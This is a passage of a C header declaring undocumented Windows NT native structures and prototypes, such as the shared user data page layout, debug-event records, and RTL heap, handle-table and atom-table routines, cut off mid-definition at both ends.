	StandardDesign,                 // None == 0 == standard design
	NEC98x86,                       // NEC PC98xx series on X86
	EndAlternatives                 // past end of known alternatives
} ALTERNATIVE_ARCHITECTURE_TYPE;

#define NX_SUPPORT_POLICY_ALWAYSOFF 0
#define NX_SUPPORT_POLICY_ALWAYSON 1
#define NX_SUPPORT_POLICY_OPTIN 2
#define NX_SUPPORT_POLICY_OPTOUT 3

#define PROCESSOR_FEATURE_MAX 64
#define MAX_WOW64_SHARED_ENTRIES 16

#if defined(_MSC_VER) && (_MSC_VER < 1300)

#define XSTATE_LEGACY_FLOATING_POINT        0
#define XSTATE_LEGACY_SSE                   1
#define XSTATE_GSSE                         2

#define XSTATE_MASK_LEGACY_FLOATING_POINT   (1i64 << (XSTATE_LEGACY_FLOATING_POINT))
#define XSTATE_MASK_LEGACY_SSE              (1i64 << (XSTATE_LEGACY_SSE))
#define XSTATE_MASK_LEGACY                  (XSTATE_MASK_LEGACY_FLOATING_POINT | XSTATE_MASK_LEGACY_SSE)
#define XSTATE_MASK_GSSE                    (1i64 << (XSTATE_GSSE))

#define MAXIMUM_XSTATE_FEATURES             64

//
// Extended processor state configuration
//
#if defined(_WINNT_) && defined(_MSC_VER) && _MSC_VER < 1300
typedef struct _XSTATE_FEATURE {
    DWORD Offset;
    DWORD Size;
} XSTATE_FEATURE, *PXSTATE_FEATURE;

typedef struct _XSTATE_CONFIGURATION {
    // Mask of enabled features
    DWORD64 EnabledFeatures;

    // Total size of the save area
    DWORD Size;

    DWORD OptimizedSave : 1;

    // List of features (
    XSTATE_FEATURE Features[MAXIMUM_XSTATE_FEATURES];

} XSTATE_CONFIGURATION, *PXSTATE_CONFIGURATION;
#endif

#ifndef _WINDOWS_
typedef enum _HEAP_INFORMATION_CLASS {
	HeapCompatibilityInformation
} HEAP_INFORMATION_CLASS;
#endif //_WINDOWS_

#endif

typedef struct _KUSER_SHARED_DATA
{
    ULONG TickCountLowDeprecated;
    ULONG TickCountMultiplier;

    volatile KSYSTEM_TIME InterruptTime;
    volatile KSYSTEM_TIME SystemTime;
    volatile KSYSTEM_TIME TimeZoneBias;

    USHORT ImageNumberLow;
    USHORT ImageNumberHigh;

    WCHAR NtSystemRoot[260];

    ULONG MaxStackTraceDepth;

    ULONG CryptoExponent;

    ULONG TimeZoneId;
    ULONG LargePageMinimum;
    ULONG Reserved2[7];

    ULONG NtProductType;
    BOOLEAN ProductTypeIsValid;

    ULONG NtMajorVersion;
    ULONG NtMinorVersion;

    BOOLEAN ProcessorFeatures[PROCESSOR_FEATURE_MAX];

    ULONG Reserved1;
    ULONG Reserved3;

    volatile ULONG TimeSlip;

    ALTERNATIVE_ARCHITECTURE_TYPE AlternativeArchitecture;

    LARGE_INTEGER SystemExpirationDate;

    ULONG SuiteMask;

    BOOLEAN KdDebuggerEnabled;

    UCHAR NXSupportPolicy;

    volatile ULONG ActiveConsoleId;

    volatile ULONG DismountCount;

    ULONG ComPlusPackage;

    ULONG LastSystemRITEventTickCount;

    ULONG NumberOfPhysicalPages;

    BOOLEAN SafeBootMode;
    union
    {
        UCHAR TscQpcData;
        struct
        {
            UCHAR TscQpcEnabled : 1;
            UCHAR TscQpcSpareFlag : 1;
            UCHAR TscQpcShift : 6;
        };
    };
    UCHAR TscQpcPad[2];

    union
    {
        ULONG TraceLogging;
        ULONG SharedDataFlags;
        struct
        {
            ULONG DbgErrorPortPresent : 1;
            ULONG DbgElevationEnabled : 1;
            ULONG DbgVirtEnabled : 1;
            ULONG DbgInstallerDetectEnabled : 1;
            ULONG DbgSystemDllRelocated : 1;
            ULONG DbgDynProcessorEnabled : 1;
            ULONG DbgSEHValidationEnabled : 1;
            ULONG SpareBits : 25;
        };
    };
    ULONG DataFlagsPad[1];

    ULONGLONG TestRetInstruction;
    ULONG SystemCall;
    ULONG SystemCallReturn;
    ULONGLONG SystemCallPad[3];

    union
    {
        volatile KSYSTEM_TIME TickCount;
        volatile ULONG64 TickCountQuad;
        struct
        {
            ULONG ReservedTickCountOverlay[3];
            ULONG TickCountPad[1];
        };
    };

    ULONG Cookie;

    // Entries below all invalid below Windows Vista

    ULONG CookiePad[1];

    LONGLONG ConsoleSessionForegroundProcessId;

    ULONG Wow64SharedInformation[MAX_WOW64_SHARED_ENTRIES];

    USHORT UserModeGlobalLogger[16];
    ULONG ImageFileExecutionOptions;

    ULONG LangGenerationCount;

    union
    {
        ULONGLONG AffinityPad; // only valid on Windows Vista
        ULONG_PTR ActiveProcessorAffinity; // only valid on Windows Vista
        ULONGLONG Reserved5;
    };
    volatile ULONG64 InterruptTimeBias;
    volatile ULONG64 TscQpcBias;

    volatile ULONG ActiveProcessorCount;
    volatile USHORT ActiveGroupCount;
    USHORT Reserved4;

    volatile ULONG AitSamplingValue;
    volatile ULONG AppCompatFlag;

    ULONGLONG SystemDllNativeRelocation;
    ULONG SystemDllWowRelocation;

    ULONG XStatePad[1];
    XSTATE_CONFIGURATION XState;
} KUSER_SHARED_DATA, *PKUSER_SHARED_DATA;

C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TickCountMultiplier) == 0x4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, InterruptTime) == 0x8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemTime) == 0x14);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TimeZoneBias) == 0x20);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ImageNumberLow) == 0x2c);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ImageNumberHigh) == 0x2e);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NtSystemRoot) == 0x30);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, MaxStackTraceDepth) == 0x238);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, CryptoExponent) == 0x23c);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TimeZoneId) == 0x240);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, LargePageMinimum) == 0x244);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Reserved2) == 0x248);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NtProductType) == 0x264);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ProductTypeIsValid) == 0x268);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NtMajorVersion) == 0x26c);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NtMinorVersion) == 0x270);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ProcessorFeatures) == 0x274);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Reserved1) == 0x2b4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Reserved3) == 0x2b8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TimeSlip) == 0x2bc);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, AlternativeArchitecture) == 0x2c0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemExpirationDate) == 0x2c8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SuiteMask) == 0x2d0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, KdDebuggerEnabled) == 0x2d4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NXSupportPolicy) == 0x2d5);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ActiveConsoleId) == 0x2d8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, DismountCount) == 0x2dC);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ComPlusPackage) == 0x2e0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, LastSystemRITEventTickCount) == 0x2e4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NumberOfPhysicalPages) == 0x2e8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SafeBootMode) == 0x2ec);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TraceLogging) == 0x2f0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TestRetInstruction) == 0x2f8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemCall) == 0x300);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemCallReturn) == 0x304);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemCallPad) == 0x308);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TickCount) == 0x320);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TickCountQuad) == 0x320);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Cookie) == 0x330);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ConsoleSessionForegroundProcessId) == 0x338);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Wow64SharedInformation) == 0x340);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, UserModeGlobalLogger) == 0x380);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ImageFileExecutionOptions) == 0x3a0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, LangGenerationCount) == 0x3a4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, InterruptTimeBias) == 0x3b0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, UserModeGlobalLogger) == 0x380);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ImageFileExecutionOptions) == 0x3a0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, LangGenerationCount) == 0x3a4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Reserved5) == 0x3a8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, InterruptTimeBias) == 0x3b0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TscQpcBias) == 0x3b8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ActiveProcessorCount) == 0x3c0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ActiveGroupCount) == 0x3c4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Reserved4) == 0x3c6);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, AitSamplingValue) == 0x3c8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, AppCompatFlag) == 0x3cc);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemDllNativeRelocation) == 0x3d0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemDllWowRelocation) == 0x3d8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, XState) == 0x3e0);

#define SHARED_USER_DATA_VA 0x7FFE0000
#define USER_SHARED_DATA ((KUSER_SHARED_DATA * const)SHARED_USER_DATA_VA)

__inline struct _KUSER_SHARED_DATA * GetKUserSharedData() { return (USER_SHARED_DATA); }

__forceinline ULONG NtGetTickCount() { return (ULONG) ((USER_SHARED_DATA->TickCountQuad * USER_SHARED_DATA->TickCountMultiplier) >> 24); }

//added 20/03/2011
#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED 0x00000001
#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002
#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE 0x00000004

//added 20/03/2011
typedef struct _RTL_PROCESS_REFLECTION_INFORMATION
{
	HANDLE Process;
	HANDLE Thread;
	CLIENT_ID ClientId;
} RTL_PROCESS_REFLECTION_INFORMATION, *PRTL_PROCESS_REFLECTION_INFORMATION;

//FIXED 21.02.2011 size for x64
typedef struct _VM_COUNTERS {
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
} VM_COUNTERS;
typedef VM_COUNTERS *PVM_COUNTERS;

#if (_MSC_VER < 1300) && !defined(_WINDOWS_)
typedef struct _IO_COUNTERS {
	ULONGLONG  ReadOperationCount;
	ULONGLONG  WriteOperationCount;
	ULONGLONG  OtherOperationCount;
	ULONGLONG ReadTransferCount;
	ULONGLONG WriteTransferCount;
	ULONGLONG OtherTransferCount;
} IO_COUNTERS;
typedef IO_COUNTERS *PIO_COUNTERS;
#endif

// SystemProcessesAndThreadsInformation
//FIXED 21.02.2011 size for x64 (and as well for x86 too)
typedef struct _SYSTEM_PROCESSES_INFORMATION {
	ULONG NextEntryDelta;
	ULONG ThreadCount;
	LARGE_INTEGER SpareLi1;
	LARGE_INTEGER SpareLi2;
	LARGE_INTEGER SpareLi3;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	HANDLE InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	ULONG_PTR PageDirectoryBase;
	VM_COUNTERS VmCounters;
	IO_COUNTERS IoCounters;
	SYSTEM_THREAD_INFORMATION Threads[1];
} SYSTEM_PROCESSES_INFORMATION, *PSYSTEM_PROCESSES_INFORMATION;

#define SIZEOF_BP_BUFFER 32
#define LPC_BUFFER_SIZE 0x130

typedef struct _DBGKM_EXCEPTION
{
	EXCEPTION_RECORD ExceptionRecord;
	ULONG FirstChance;
} DBGKM_EXCEPTION, *PDBGKM_EXCEPTION;

typedef struct _DBGKM_CREATE_THREAD
{
	ULONG SubSystemKey;
	PVOID StartAddress;
} DBGKM_CREATE_THREAD, *PDBGKM_CREATE_THREAD;

typedef struct _DBGKM_CREATE_PROCESS
{
	ULONG SubSystemKey;
	HANDLE FileHandle;
	PVOID BaseOfImage;
	ULONG DebugInfoFileOffset;
	ULONG DebugInfoSize;
	DBGKM_CREATE_THREAD InitialThread;
} DBGKM_CREATE_PROCESS, *PDBGKM_CREATE_PROCESS;

typedef struct _DBGKM_EXIT_THREAD
{
	NTSTATUS ExitStatus;
} DBGKM_EXIT_THREAD, *PDBGKM_EXIT_THREAD;

typedef struct _DBGKM_EXIT_PROCESS
{
	NTSTATUS ExitStatus;
} DBGKM_EXIT_PROCESS, *PDBGKM_EXIT_PROCESS;

typedef struct _DBGKM_LOAD_DLL
{
	HANDLE FileHandle;
	PVOID BaseOfDll;
	ULONG DebugInfoFileOffset;
	ULONG DebugInfoSize;
	PVOID NamePointer;
} DBGKM_LOAD_DLL, *PDBGKM_LOAD_DLL;

typedef struct _DBGKM_UNLOAD_DLL
{
	PVOID BaseAddress;
} DBGKM_UNLOAD_DLL, *PDBGKM_UNLOAD_DLL;

typedef enum _DBG_STATE
{
	DbgIdle,
	DbgReplyPending,
	DbgCreateThreadStateChange,
	DbgCreateProcessStateChange,
	DbgExitThreadStateChange,
	DbgExitProcessStateChange,
	DbgExceptionStateChange,
	DbgBreakpointStateChange,
	DbgSingleStepStateChange,
	DbgLoadDllStateChange,
	DbgUnloadDllStateChange
} DBG_STATE, *PDBG_STATE;

typedef struct _DBGUI_CREATE_THREAD
{
	HANDLE HandleToThread;
	DBGKM_CREATE_THREAD NewThread;
} DBGUI_CREATE_THREAD, *PDBGUI_CREATE_THREAD;

typedef struct _DBGUI_CREATE_PROCESS
{
	HANDLE HandleToProcess;
	HANDLE HandleToThread;
	DBGKM_CREATE_PROCESS NewProcess;
} DBGUI_CREATE_PROCESS, *PDBGUI_CREATE_PROCESS;

typedef struct _DBGUI_WAIT_STATE_CHANGE
{
	DBG_STATE NewState;
	CLIENT_ID AppClientId;
	union
	{
		DBGKM_EXCEPTION Exception;
		DBGUI_CREATE_THREAD CreateThread;
		DBGUI_CREATE_PROCESS CreateProcessInfo;
		DBGKM_EXIT_THREAD ExitThread;
		DBGKM_EXIT_PROCESS ExitProcess;
		DBGKM_LOAD_DLL LoadDll;
		DBGKM_UNLOAD_DLL UnloadDll;
	} StateInfo;
} DBGUI_WAIT_STATE_CHANGE, *PDBGUI_WAIT_STATE_CHANGE;

#define DEBUG_READ_EVENT 0x0001
#define DEBUG_PROCESS_ASSIGN 0x0002
#define DEBUG_SET_INFORMATION 0x0004
#define DEBUG_QUERY_INFORMATION 0x0008
#define DEBUG_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | \
	DEBUG_READ_EVENT | DEBUG_PROCESS_ASSIGN | DEBUG_SET_INFORMATION | \
	DEBUG_QUERY_INFORMATION)

#define DEBUG_KILL_ON_CLOSE 0x1

typedef enum _DEBUGOBJECTINFOCLASS
{
	DebugObjectFlags = 1,
	MaxDebugObjectInfoClass
} DEBUGOBJECTINFOCLASS, *PDEBUGOBJECTINFOCLASS;


//added 21/03/2011
//begin
typedef struct _RTL_HEAP_TAG_INFO
{
	ULONG NumberOfAllocations;
	ULONG NumberOfFrees;
	SIZE_T BytesAllocated;
} RTL_HEAP_TAG_INFO, *PRTL_HEAP_TAG_INFO;

#define RTL_HEAP_MAKE_TAG HEAP_MAKE_TAG_FLAGS
#define MAKE_TAG( t ) (RTL_HEAP_MAKE_TAG( NtdllBaseTag, t ))

typedef NTSTATUS (NTAPI *PRTL_ENUM_HEAPS_ROUTINE)(
	IN PVOID HeapHandle,
	IN PVOID Parameter
	);

typedef struct _RTL_HEAP_USAGE_ENTRY
{
	struct _RTL_HEAP_USAGE_ENTRY *Next;
	PVOID Address;
	SIZE_T Size;
	USHORT AllocatorBackTraceIndex;
	USHORT TagIndex;
} RTL_HEAP_USAGE_ENTRY, *PRTL_HEAP_USAGE_ENTRY;

typedef struct _RTL_HEAP_USAGE
{
	ULONG Length;
	SIZE_T BytesAllocated;
	SIZE_T BytesCommitted;
	SIZE_T BytesReserved;
	SIZE_T BytesReservedMaximum;
	PRTL_HEAP_USAGE_ENTRY Entries;
	PRTL_HEAP_USAGE_ENTRY AddedEntries;
	PRTL_HEAP_USAGE_ENTRY RemovedEntries;
	ULONG_PTR Reserved[8];
} RTL_HEAP_USAGE, *PRTL_HEAP_USAGE;

#define HEAP_USAGE_ALLOCATED_BLOCKS HEAP_REALLOC_IN_PLACE_ONLY
#define HEAP_USAGE_FREE_BUFFER HEAP_ZERO_MEMORY

typedef struct _RTL_HEAP_WALK_ENTRY
{
	PVOID DataAddress;
	SIZE_T DataSize;
	UCHAR OverheadBytes;
	UCHAR SegmentIndex;
	USHORT Flags;
	union
	{
		struct
		{
			SIZE_T Settable;
			USHORT TagIndex;
			USHORT AllocatorBackTraceIndex;
			ULONG Reserved[2];
		} Block;
		struct
		{
			ULONG CommittedSize;
			ULONG UnCommittedSize;
			PVOID FirstEntry;
			PVOID LastEntry;
		} Segment;
	};
} RTL_HEAP_WALK_ENTRY, *PRTL_HEAP_WALK_ENTRY;

#define HeapDebuggingInformation 0x80000002

typedef NTSTATUS (NTAPI *PRTL_HEAP_LEAK_ENUMERATION_ROUTINE)(
	IN LONG Reserved,
	IN PVOID HeapHandle,
	IN PVOID BaseAddress,
	IN SIZE_T BlockSize,
	IN ULONG StackTraceDepth,
	IN PVOID *StackTrace
	);

typedef struct _HEAP_DEBUGGING_INFORMATION
{
	PVOID InterceptorFunction;
	USHORT InterceptorValue;
	ULONG ExtendedOptions;
	ULONG StackTraceDepth;
	SIZE_T MinTotalBlockSize;
	SIZE_T MaxTotalBlockSize;
	PRTL_HEAP_LEAK_ENUMERATION_ROUTINE HeapLeakEnumerationRoutine;
} HEAP_DEBUGGING_INFORMATION, *PHEAP_DEBUGGING_INFORMATION;

// added 11/04/2011
#define PREALLOCATE_EVENT_MASK  0x80000000

#define RtlInitializeLockRoutine(L) RtlInitializeCriticalSectionAndSpinCount((PRTL_CRITICAL_SECTION)(L),(PREALLOCATE_EVENT_MASK | 4000))
#define RtlAcquireLockRoutine(L)    RtlEnterCriticalSection((PRTL_CRITICAL_SECTION)(L))
#define RtlReleaseLockRoutine(L)    RtlLeaveCriticalSection((PRTL_CRITICAL_SECTION)(L))
#define RtlDeleteLockRoutine(L)     RtlDeleteCriticalSection((PRTL_CRITICAL_SECTION)(L))

typedef struct _RTL_MEMORY_ZONE_SEGMENT
{
	struct _RTL_MEMORY_ZONE_SEGMENT *NextSegment;
	SIZE_T Size;
	PVOID Next;
	PVOID Limit;
} RTL_MEMORY_ZONE_SEGMENT, *PRTL_MEMORY_ZONE_SEGMENT;

#if defined(_WINNT_) && defined(_MSC_VER) && (_MSC_VER < 1300)
typedef struct _RTL_SRWLOCK {                            
	PVOID Ptr;                                       
} RTL_SRWLOCK, *PRTL_SRWLOCK; 
#endif

typedef struct _RTL_MEMORY_ZONE
{
	RTL_MEMORY_ZONE_SEGMENT Segment;
	RTL_SRWLOCK Lock;
	ULONG LockCount;
	PRTL_MEMORY_ZONE_SEGMENT FirstSegment;
} RTL_MEMORY_ZONE, *PRTL_MEMORY_ZONE;

typedef struct _RTL_PROCESS_VERIFIER_OPTIONS
{
	ULONG SizeStruct;
	ULONG Option;
	UCHAR OptionData[1];
} RTL_PROCESS_VERIFIER_OPTIONS, *PRTL_PROCESS_VERIFIER_OPTIONS;

typedef struct _RTL_PROCESS_LOCKS {
	ULONG NumberOfLocks;
	RTL_PROCESS_LOCK_INFORMATION Locks[ 1 ];
} RTL_PROCESS_LOCKS, *PRTL_PROCESS_LOCKS;

#define MAX_STACK_DEPTH 32

typedef struct _RTL_PROCESS_BACKTRACE_INFORMATION {
	PCHAR SymbolicBackTrace;
	ULONG TraceCount;
	USHORT Index;
	USHORT Depth;
	PVOID BackTrace[ MAX_STACK_DEPTH ];
} RTL_PROCESS_BACKTRACE_INFORMATION, *PRTL_PROCESS_BACKTRACE_INFORMATION;

typedef struct _RTL_PROCESS_BACKTRACES {
	ULONG CommittedMemory;
	ULONG ReservedMemory;
	ULONG NumberOfBackTraceLookups;
	ULONG NumberOfBackTraces;
	RTL_PROCESS_BACKTRACE_INFORMATION BackTraces[ 1 ];
} RTL_PROCESS_BACKTRACES, *PRTL_PROCESS_BACKTRACES;

typedef struct _RTL_DEBUG_INFORMATION
{
	HANDLE SectionHandleClient;
	PVOID ViewBaseClient;
	PVOID ViewBaseTarget;
	ULONG_PTR ViewBaseDelta;
	HANDLE EventPairClient;
	HANDLE EventPairTarget;
	HANDLE TargetProcessId;
	HANDLE TargetThreadHandle;
	ULONG Flags;
	SIZE_T OffsetFree;
	SIZE_T CommitSize;
	SIZE_T ViewSize;
	union
	{
		PRTL_PROCESS_MODULES Modules;
		PRTL_PROCESS_MODULE_INFORMATION_EX *ModulesEx;
	};
	PRTL_PROCESS_BACKTRACES BackTraces;
	PRTL_PROCESS_HEAPS Heaps;
	PRTL_PROCESS_LOCKS Locks;
	PVOID SpecificHeap;
	HANDLE TargetProcessHandle;
	PRTL_PROCESS_VERIFIER_OPTIONS VerifierOptions;
	PVOID ProcessHeap;
	HANDLE CriticalSectionHandle;
	HANDLE CriticalSectionOwnerThread;
	PVOID Reserved[4];
} RTL_DEBUG_INFORMATION, *PRTL_DEBUG_INFORMATION;

//added 21/03/2011
//end


// added: 22/04/2011 - RtlStream
typedef struct _RTL_MEMORY_STREAM_DATA *PRTL_MEMORY_STREAM_DATA;
typedef struct _RTL_MEMORY_STREAM_WITH_VTABLE *PRTL_MEMORY_STREAM_WITH_VTABLE;
typedef struct _RTL_OUT_OF_PROCESS_MEMORY_STREAM_DATA *PRTL_OUT_OF_PROCESS_MEMORY_STREAM_DATA;

HRESULT
NTAPI
RtlReleaseMemoryStream(
	PRTL_MEMORY_STREAM_WITH_VTABLE MemoryStream
	);

HRESULT
NTAPI
RtlSetMemoryStreamSize(
	PRTL_MEMORY_STREAM_WITH_VTABLE MemoryStream,
	ULARGE_INTEGER ULargeInteger
	);

HRESULT
NTAPI
RtlCommitMemoryStream(
	PRTL_MEMORY_STREAM_WITH_VTABLE MemoryStream,
	ULONG NewStream
	);

HRESULT
NTAPI
RtlRevertMemoryStream(
	PRTL_MEMORY_STREAM_WITH_VTABLE MemoryStream
	);

NTSTATUS
NTAPI
RtlCopySecurityDescriptor(
	PSECURITY_DESCRIPTOR SourceDescriptor,
	PSECURITY_DESCRIPTOR DestinationDescriptor
	);


typedef struct _RTL_HANDLE_TABLE_ENTRY
{
	union
	{
		ULONG Flags;
		struct _RTL_HANDLE_TABLE_ENTRY *NextFree;
	};
} RTL_HANDLE_TABLE_ENTRY, *PRTL_HANDLE_TABLE_ENTRY;

#define RTL_HANDLE_ALLOCATED (USHORT)0x0001

typedef struct _RTL_HANDLE_TABLE
{
	ULONG MaximumNumberOfHandles;
	ULONG SizeOfHandleTableEntry;
	ULONG Reserved[2];
	PRTL_HANDLE_TABLE_ENTRY FreeHandles;
	PRTL_HANDLE_TABLE_ENTRY CommittedHandles;
	PRTL_HANDLE_TABLE_ENTRY UnCommittedHandles;
	PRTL_HANDLE_TABLE_ENTRY MaxReservedHandles;
} RTL_HANDLE_TABLE, *PRTL_HANDLE_TABLE;

#if defined(_WINNT_) && (_MSC_VER < 1300) && !defined(_WINDOWS_)
typedef struct _JOB_SET_ARRAY {
    HANDLE JobHandle;   // Handle to job object to insert
    DWORD MemberLevel;  // Level of this job in the set. Must be > 0. Can be sparse.
    DWORD Flags;        // Unused. Must be zero
} JOB_SET_ARRAY, *PJOB_SET_ARRAY;
#endif

VOID
NTAPI
RtlInitializeHandleTable(
	IN ULONG MaximumNumberOfHandles,
	IN ULONG SizeOfHandleTableEntry,
	OUT PRTL_HANDLE_TABLE HandleTable
	);

NTSTATUS
NTAPI
RtlDestroyHandleTable(
	IN OUT PRTL_HANDLE_TABLE HandleTable
	);

PRTL_HANDLE_TABLE_ENTRY
NTAPI
RtlAllocateHandle(
	IN PRTL_HANDLE_TABLE HandleTable,
	OUT OPTIONAL PULONG HandleIndex
	);

BOOLEAN
NTAPI
RtlFreeHandle(
	IN PRTL_HANDLE_TABLE HandleTable,
	IN PRTL_HANDLE_TABLE_ENTRY Handle
	);

BOOLEAN
NTAPI
RtlIsValidHandle(
	IN PRTL_HANDLE_TABLE HandleTable,
	IN PRTL_HANDLE_TABLE_ENTRY Handle
	);

BOOLEAN
NTAPI
RtlIsValidIndexHandle(
	IN PRTL_HANDLE_TABLE HandleTable,
	IN ULONG HandleIndex,
	OUT PRTL_HANDLE_TABLE_ENTRY *Handle
	);

#define RTL_ATOM_MAXIMUM_INTEGER_ATOM (RTL_ATOM)0xc000
#define RTL_ATOM_INVALID_ATOM (RTL_ATOM)0x0000
#define RTL_ATOM_TABLE_DEFAULT_NUMBER_OF_BUCKETS 37
#define RTL_ATOM_MAXIMUM_NAME_LENGTH 255
#define RTL_ATOM_PINNED 0x01

NTSTATUS
NTAPI
RtlCreateAtomTable(
	IN ULONG NumberOfBuckets,
	OUT PVOID *AtomTableHandle
	);

NTSTATUS
NTAPI
RtlDestroyAtomTable(
	IN PVOID AtomTableHandle
	);

NTSTATUS
NTAPI
RtlEmptyAtomTable(
	IN PVOID AtomTableHandle,
	IN BOOLEAN IncludePinnedAtoms
	);

NTSTATUS
NTAPI
RtlAddAtomToAtomTable(
	IN PVOID AtomTableHandle,
	IN PWSTR AtomName,
	IN OUT OPTIONAL PRTL_ATOM Atom
	);

NTSTATUS
NTAPI
RtlLookupAtomInAtomTable(
	IN PVOID AtomTableHandle,
	IN PWSTR AtomName,
	OUT OPTIONAL PRTL_ATOM Atom
	);

NTSTATUS
NTAPI
RtlDeleteAtomFromAtomTable(
	IN PVOID AtomTableHandle,
	IN RTL_ATOM Atom
	);

NTSTATUS
NTAPI
RtlPinAtomInAtomTable(
	IN PVOID AtomTableHandle,
	IN RTL_ATOM Atom
	);

NTSTATUS
NTAPI
RtlQueryAtomInAtomTable(
	IN PVOID AtomTableHandle,
	IN RTL_ATOM Atom,
	OUT OPTIONAL PULONG AtomUsage,
	OUT OPTIONAL PULONG AtomFlags,
	IN OUT PWSTR AtomName,
	IN OUT OPTIONAL PULONG AtomNameLength
	);

NTSTATUS
NTAPI
RtlQueryAtomsInAtomTable(
	IN PVOID AtomTableHandle,
	IN ULONG MaximumNumberOfAtoms,
	OUT PULONG NumberOfAtoms,
	OUT PRTL_ATOM Atoms
	);

BOOLEAN
NTAPI
RtlGetIntegerAtom(
	IN PWSTR AtomName,
	OUT OPTIONAL PUSHORT IntegerAtom
	);

#define EVENT_MIN_LEVEL                      (0)
#define EVENT_MAX_LEVEL                      (0xff)

#define EVENT_ACTIVITY_CTRL_GET_ID           (1)
#define EVENT_ACTIVITY_CTRL_SET_ID           (2)
#define EVENT_ACTIVITY_CTRL_CREATE_ID        (3)
#define EVENT_ACTIVITY_CTRL_GET_SET_ID       (4)
#define EVENT_ACTIVITY_CTRL_CREATE_SET_ID    (5)

	typedef ULONGLONG REGHANDLE, *PREGHANDLE;

#define MAX_EVENT_DATA_DESCRIPTORS           (128)
#define MAX_EVENT_FILTER_DATA_SIZE           (1024)

	//
	// EVENT_DATA_DESCRIPTOR is used to pass in user data items
	// in events.
	// 

	typedef struct _EVENT_DATA_DESCRIPTOR
	{
		ULONG_PTR   Ptr;        // Pointer to data
		ULONG       Size;       // Size of data in bytes
		ULONG       Reserved;
	} EVENT_DATA_DESCRIPTOR, *PEVENT_DATA_DESCRIPTOR;

	typedef struct _EVENT_DESCRIPTOR
	{
		USHORT      Id;
		UCHAR       Version;
